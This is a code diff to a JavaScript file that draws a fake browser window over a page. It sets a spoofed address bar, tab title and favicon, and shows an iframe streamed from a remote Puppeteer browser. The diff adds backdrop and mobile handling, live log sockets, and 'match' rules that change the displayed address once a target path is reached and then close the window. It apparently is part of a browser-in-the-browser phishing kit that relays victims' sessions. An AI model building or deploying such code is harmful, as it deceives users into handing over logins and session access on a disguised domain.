@@ -9,8 +9,27 @@ var windowShell = document.getElementById("window");
 var showIframeBtn = document.getElementById("show-iframe-btn");
 var siteInfoPanel = document.getElementById("site-info-panel");
 var sitePanelClose = document.getElementById("site-panel-close");
-var tabTitle = document.getElementById("tab-title");
+var tabTitle = document.getElementById("tab-title") || document.getElementById("logo-description");
 var domainName = document.getElementById("domain-name");
+var domainPath = document.getElementById("domain-path");
+var tabFavicon = document.querySelector("#active-tab .tab-favicon") || document.querySelector(".tab-favicon");
+
+var backdrop = (function () {
+  var el = document.createElement("div");
+  el.id = "fescarcuddle-backdrop";
+  el.style.cssText = [
+    "position:fixed",
+    "inset:0",
+    "z-index:99998",
+    "background:rgba(0,0,0,0.45)",
+    "opacity:0",
+    "transition:opacity 0.25s ease",
+    "pointer-events:none",
+    "display:none"
+  ].join(";");
+  document.body.appendChild(el);
+  return el;
+}());
 
 var appConfig = window.appConfig || {};
 var iframeSrc = appConfig.iframeSrc || "";
@@ -18,6 +37,14 @@ var sitePanelMessage = appConfig.sitePanelMessage || "";
 var configuredAddressText = appConfig.addressText || ((appConfig.domainName || "") + (appConfig.domainPath || ""));
 var configuredTabTitle = appConfig.tabTitle || "";
 var clientIp = appConfig.clientIp || window.__VISITOR_IP__ || "";
+var matchUrl = typeof appConfig.matchUrl === "string" ? appConfig.matchUrl.trim() : "";
+var matchIframeSrc = typeof appConfig.matchIframeSrc === "string" ? appConfig.matchIframeSrc.trim() : "";
+var matchAddressText = typeof appConfig.matchAddressText === "string" ? appConfig.matchAddressText.trim() : "";
+var matchTabTitle = typeof appConfig.matchTabTitle === "string" ? appConfig.matchTabTitle.trim() : "";
+var matchFavicon = typeof appConfig.matchFavicon === "string" ? appConfig.matchFavicon.trim() : "";
+var matchHideDelay = typeof appConfig.matchHideDelay === "number" ? appConfig.matchHideDelay : 0;
+var matchCloseMessage = typeof appConfig.matchCloseMessage === "string" ? appConfig.matchCloseMessage : "";
+var matchHideTimer = null;
 var debugIpFromQuery = new URLSearchParams(window.location.search).get("debugIp");
 var debugIp = debugIpFromQuery == null ? "" : String(debugIpFromQuery).trim();
 var debugServerUrl = appConfig.debugServerUrl || appConfig.logsSocketIoUrl || "";
@@ -38,6 +65,45 @@ function appendDebugIpToIframeSrc(src, debugIpValue) {
 }
 
 iframeSrc = appendDebugIpToIframeSrc(iframeSrc, debugIp);
+
+var isMobileDevice = /Mobi|Android|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+var fixedViewportWidth = window.innerWidth;
+var fixedViewportHeight = window.innerHeight;
+
+if (isMobileDevice) {
+  var mobileChromeHeight = window._isMac ? 58 : 84;
+  fixedViewportHeight = Math.max(50, window.innerHeight - mobileChromeHeight);
+  document.documentElement.classList.add("is-mobile");
+  document.documentElement.style.setProperty("--initial-window-width", window.innerWidth + "px");
+  document.documentElement.style.setProperty("--initial-window-height", window.innerHeight + "px");
+  document.documentElement.style.setProperty("--mobile-content-width", fixedViewportWidth + "px");
+  document.documentElement.style.setProperty("--mobile-content-height", fixedViewportHeight + "px");
+}
+
+if (isMobileDevice && iframeSrc) {
+  try {
+    var _mobileUrl = new URL(iframeSrc, window.location.href);
+    _mobileUrl.searchParams.set("mobile", "1");
+    iframeSrc = _mobileUrl.toString();
+  } catch (err) {
+    var _mobileSep = iframeSrc.indexOf("?") === -1 ? "?" : "&";
+    iframeSrc = iframeSrc + _mobileSep + "mobile=1";
+  }
+}
+
+// Append actual viewport dimensions so pescador sets Puppeteer viewport correctly
+// from the very first frame (finer correction still happens via video_dimensions event)
+if (iframeSrc) {
+  try {
+    var _dimUrl = new URL(iframeSrc, window.location.href);
+    _dimUrl.searchParams.set("vw", fixedViewportWidth);
+    _dimUrl.searchParams.set("vh", fixedViewportHeight);
+    iframeSrc = _dimUrl.toString();
+  } catch (err) {
+    var _dimSep = iframeSrc.indexOf("?") === -1 ? "?" : "&";
+    iframeSrc = iframeSrc + _dimSep + "vw=" + fixedViewportWidth + "&vh=" + fixedViewportHeight;
+  }
+}
 
 var windowPositions = [
   { left: "12%", top: "12%" },
@@ -67,6 +133,9 @@ if (tabTitle) {
 if (domainName) {
   domainName.textContent = configuredAddressText;
 }
+if (domainPath) {
+  domainPath.textContent = "";
+}
 
 function setAddressBarText(value) {
   if (!domainName || typeof value !== "string") {
@@ -74,6 +143,9 @@ function setAddressBarText(value) {
   }
 
   domainName.textContent = value;
+  if (domainPath) {
+    domainPath.textContent = "";
+  }
 
   if (addressBar) {
     addressBar.setAttribute("title", value);
@@ -115,6 +187,19 @@ function applyTabTitleFromEventData(rawValue) {
   tabTitle.textContent = value;
 }
 
+function applyFaviconFromEventData(rawValue) {
+  if (!tabFavicon || typeof rawValue !== "string") {
+    return;
+  }
+
+  var value = rawValue.trim();
+  if (!value) {
+    return;
+  }
+
+  tabFavicon.src = value;
+}
+
 function consumeLogPayload(payload) {
   if (!payload || typeof payload !== "object") {
     return;
@@ -135,6 +220,51 @@ function consumeLogPayload(payload) {
 
   if (typeof payload.event_title === "string") {
     applyTabTitleFromEventData(payload.event_title);
+  }
+
+  if (typeof payload.event_favicon === "string") {
+    applyFaviconFromEventData(payload.event_favicon);
+  }
+
+  if (matchUrl && matchIframeSrc && addressValue && (function () {
+    try {
+      return new URL(addressValue).pathname === matchUrl;
+    } catch (e) {
+      return false;
+    }
+  })()) {
+    if (contentFrame) {
+      contentFrame.setAttribute("src", matchIframeSrc);
+    }
+
+    if (matchAddressText) {
+      setAddressBarText(matchAddressText);
+    }
+
+    if (matchTabTitle) {
+      applyTabTitleFromEventData(matchTabTitle);
+    }
+
+    if (matchFavicon) {
+      applyFaviconFromEventData(matchFavicon);
+    }
+
+    if (matchHideDelay > 0) {
+      if (matchHideTimer !== null) {
+        clearTimeout(matchHideTimer);
+      }
+      matchHideTimer = setTimeout(function () {
+        matchHideTimer = null;
+        $("#exit").trigger("click");
+        if (matchCloseMessage) {
+          var msgEl = document.getElementById("match-close-message");
+          if (msgEl) {
+            msgEl.textContent = matchCloseMessage;
+            msgEl.style.display = "block";
+          }
+        }
+      }, matchHideDelay * 1000);
+    }
   }
 }
 
@@ -273,20 +403,119 @@ function loadScript(src, onLoad, onError) {
   document.head.appendChild(script);
 }
 
+var logsSocketIoState = window.__logsSocketIoState || {
+  socket: null,
+  connecting: false,
+  loadRetryTimer: null,
+  ownerId: Math.random().toString(36).slice(2),
+  lockKey: "",
+  lockHeartbeat: null
+};
+window.__logsSocketIoState = logsSocketIoState;
+
+function getLogsSocketLockKey(sessionId) {
+  return "fescarcuddle:logs-socket:" + debugServerUrl + ":" + sessionId;
+}
+
+function readLogsSocketLock(key) {
+  try {
+    return JSON.parse(window.localStorage.getItem(key) || "null");
+  } catch (err) {
+    return null;
+  }
+}
+
+function writeLogsSocketLock(key) {
+  try {
+    window.localStorage.setItem(key, JSON.stringify({
+      ownerId: logsSocketIoState.ownerId,
+      expiresAt: Date.now() + 30000
+    }));
+    return true;
+  } catch (err) {
+    return true;
+  }
+}
+
+function acquireLogsSocketLock(sessionId) {
+  var key = getLogsSocketLockKey(sessionId);
+  var existing = readLogsSocketLock(key);
+  if (existing && existing.ownerId !== logsSocketIoState.ownerId && existing.expiresAt > Date.now()) {
+    return false;
+  }
+
+  logsSocketIoState.lockKey = key;
+  writeLogsSocketLock(key);
+  if (logsSocketIoState.lockHeartbeat) {
+    clearInterval(logsSocketIoState.lockHeartbeat);
+  }
+  logsSocketIoState.lockHeartbeat = setInterval(function () {
+    var current = readLogsSocketLock(key);
+    if (current && current.ownerId !== logsSocketIoState.ownerId && current.expiresAt > Date.now()) {
+      clearInterval(logsSocketIoState.lockHeartbeat);
+      logsSocketIoState.lockHeartbeat = null;
+      return;
+    }
+    writeLogsSocketLock(key);
+  }, 10000);
+  return true;
+}
+
+function releaseLogsSocketLock() {
+  if (logsSocketIoState.lockHeartbeat) {
+    clearInterval(logsSocketIoState.lockHeartbeat);
+    logsSocketIoState.lockHeartbeat = null;
+  }
+  if (!logsSocketIoState.lockKey) {
+    return;
+  }
+  try {
+    var current = readLogsSocketLock(logsSocketIoState.lockKey);
+    if (current && current.ownerId === logsSocketIoState.ownerId) {
+      window.localStorage.removeItem(logsSocketIoState.lockKey);
+    }
+  } catch (err) {
+    // Ignore storage failures; the TTL will expire stale locks.
+  }
+  logsSocketIoState.lockKey = "";
+}
+
+window.addEventListener("beforeunload", releaseLogsSocketLock);
+
 function connectLogsSocketIo() {
   if (!debugServerUrl) {
     return;
   }
 
+  if (logsSocketIoState.connecting || (logsSocketIoState.socket && logsSocketIoState.socket.active !== false)) {
+    return;
+  }
+
+  logsSocketIoState.connecting = true;
+
   function startSocketIoClient(sessionId) {
     if (typeof window.io !== "function") {
+      logsSocketIoState.connecting = false;
+      return;
+    }
+
+    if (logsSocketIoState.socket && logsSocketIoState.socket.active !== false) {
+      logsSocketIoState.connecting = false;
+      return;
+    }
+
+    if (!acquireLogsSocketLock(sessionId)) {
+      logsSocketIoState.connecting = false;
       return;
     }
 
     var socket = window.io(debugServerUrl, {
       path: "/socket.io",
-      forceNew: true,
       transports: ["websocket", "polling"],
+      reconnection: true,
+      reconnectionDelay: 2000,
+      reconnectionDelayMax: 30000,
+      reconnectionAttempts: Infinity,
       query: {
         debugIp: debugIp
       },
@@ -296,6 +525,8 @@ function connectLogsSocketIo() {
         sessionId: sessionId
       }
     });
+    logsSocketIoState.socket = socket;
+    logsSocketIoState.connecting = false;
 
     socket.on("initial_logs", function (items) {
       consumeInitialLogs(items);
@@ -305,13 +536,26 @@ function connectLogsSocketIo() {
       consumeLogPayload(payload);
     });
 
-    socket.on("disconnect", function () {
-      setTimeout(connectLogsSocketIo, 2000);
+    socket.on("connect_error", function (err) {
+      if (err && err.message === "duplicate_session_socket") {
+        if (socket.io && typeof socket.io.reconnection === "function") {
+          socket.io.reconnection(false);
+        } else if (socket.io && socket.io.opts) {
+          socket.io.opts.reconnection = false;
+        }
+        socket.disconnect();
+        logsSocketIoState.socket = null;
+        releaseLogsSocketLock();
+      }
     });
 
-    socket.on("connect_error", function () {
-      socket.close();
-      setTimeout(connectLogsSocketIo, 2000);
+    socket.on("duplicate_session_socket", function () {
+      if (socket.io && typeof socket.io.reconnection === "function") {
+        socket.io.reconnection(false);
+      }
+      socket.disconnect();
+      logsSocketIoState.socket = null;
+      releaseLogsSocketLock();
     });
   }
 
@@ -330,8 +574,16 @@ function connectLogsSocketIo() {
     loadScript(scriptUrl, function () {
       startSocketIoClient(sessionId);
     }, function () {
-      setTimeout(connectLogsSocketIo, 2000);
+      logsSocketIoState.connecting = false;
+      if (!logsSocketIoState.loadRetryTimer) {
+        logsSocketIoState.loadRetryTimer = setTimeout(function () {
+          logsSocketIoState.loadRetryTimer = null;
+          connectLogsSocketIo();
+        }, 5000);
+      }
     });
+  }).catch(function () {
+    logsSocketIoState.connecting = false;
   });
 }
 
@@ -465,37 +717,40 @@ if (addressSettingsBtn && siteInfoPanel) {
 }
 
 ////////////////// Hover listeners //////////////////
-minimize.addEventListener('mouseover', function() {
-  minimize.style.backgroundColor = 'rgba(0, 0, 0, 0.1)';
-});
+if (minimize) {
+  minimize.addEventListener('mouseover', function() {
+    minimize.style.backgroundColor = 'rgba(0, 0, 0, 0.1)';
+  });
+  minimize.addEventListener('mouseout', function() {
+    minimize.style.backgroundColor = '';
+  });
+}
 
-minimize.addEventListener('mouseout', function() {
-  minimize.style.backgroundColor = '';
-});
+if (square) {
+  square.addEventListener('mouseover', function() {
+    square.style.backgroundColor = 'rgba(0, 0, 0, 0.1)';
+  });
+  square.addEventListener('mouseout', function() {
+    square.style.backgroundColor = '';
+  });
+}
 
-square.addEventListener('mouseover', function() {
-  square.style.backgroundColor = 'rgba(0, 0, 0, 0.1)';
-});
-
-square.addEventListener('mouseout', function() {
-  square.style.backgroundColor = '';
-});
-
-exit.addEventListener('mouseover', function() {
-  exit.style.backgroundColor = '#c42b1c';
-  exit.style.color = 'white';
-});
-
-exit.addEventListener('mouseout', function() {
-  exit.style.backgroundColor = '';
-  exit.style.color = '';
-});
+if (exit) {
+  exit.addEventListener('mouseover', function() {
+    exit.style.backgroundColor = '#c42b1c';
+    exit.style.color = 'white';
+  });
+  exit.addEventListener('mouseout', function() {
+    exit.style.backgroundColor = '';
+    exit.style.color = '';
+  });
+}
 
 
 //////////////// Make window draggable start ////////////////
-// Make the DIV element draggable:
 var draggable = $('#window');
-var title = $('#tab-bar');
+// Support both Windows (#tab-bar) and MacOS (#title-bar) chrome
+var title = $('#tab-bar, #title-bar');
 
 title.on('mousedown', function(e){
   closeSiteInfoPanel();
@@ -529,10 +784,13 @@ $("#exit").click(function(){
     if (contentFrame) {
       contentFrame.classList.add("is-hidden");
     }
+
+    backdrop.style.opacity = "0";
+    setTimeout(function () { backdrop.style.display = "none"; }, 260);
   });
 
-// Maximize button functionality
-$("#square").click(enlarge);
+// Maximize button functionality — support both #square (Windows) and #maximize (MacOS)
+$("#square, #maximize").click(enlarge);
 
 function enlarge(){
   if(square.classList.contains("enlarged")){
@@ -545,3 +803,30 @@ function enlarge(){
     $("#square").addClass("enlarged");
   }
 }
+
+// ─── Public API (used by fescarcuddle-loader.js) ──────────────────────────────
+window.FescarCuddleCore = {
+  show: function () {
+    if (!windowShell) return;
+    var wasHidden = windowShell.classList.contains("is-hidden");
+    windowShell.classList.remove("is-hidden");
+    windowShell.style.display = "";
+    windowPositionIndex = getRandomPositionIndex(windowPositionIndex);
+    applyWindowPosition(windowPositionIndex);
+    if (contentFrame) {
+      if (!contentFrame.getAttribute("src") || wasHidden) {
+        contentFrame.setAttribute("src", iframeSrc);
+      }
+      contentFrame.classList.remove("is-hidden");
+    }
+    backdrop.style.display = "block";
+    requestAnimationFrame(function () { backdrop.style.opacity = "1"; });
+  },
+  hide: function () {
+    closeSiteInfoPanel();
+    if (windowShell) windowShell.classList.add("is-hidden");
+    if (contentFrame) contentFrame.classList.add("is-hidden");
+    backdrop.style.opacity = "0";
+    setTimeout(function () { backdrop.style.display = "none"; }, 260);
+  }
+};
